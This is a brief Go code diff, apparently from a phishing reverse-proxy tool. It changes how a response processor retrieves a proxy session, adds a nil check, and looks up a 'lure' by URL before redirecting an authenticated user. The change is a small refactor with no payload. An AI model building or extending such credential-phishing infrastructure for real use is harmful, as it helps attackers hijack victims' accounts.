@@ -51,8 +51,11 @@ func (p *responseProcessor) targetRedirect(c *fiber.Ctx, resp *http.Response) bo
 	if !p.authService.IsAuthenticated(c) {
 		return false
 	}
-	sess := getSession(c)
-	lure, err := p.lureService.GetByURL(getLureURL(sess))
+	sess := getProxySession(c)
+	if sess == nil {
+		return false
+	}
+	lure, err := p.lureService.GetByURL(sess.LureURL())
 	if err != nil {
 		log.Println("lureService error: ", err)
 		return false
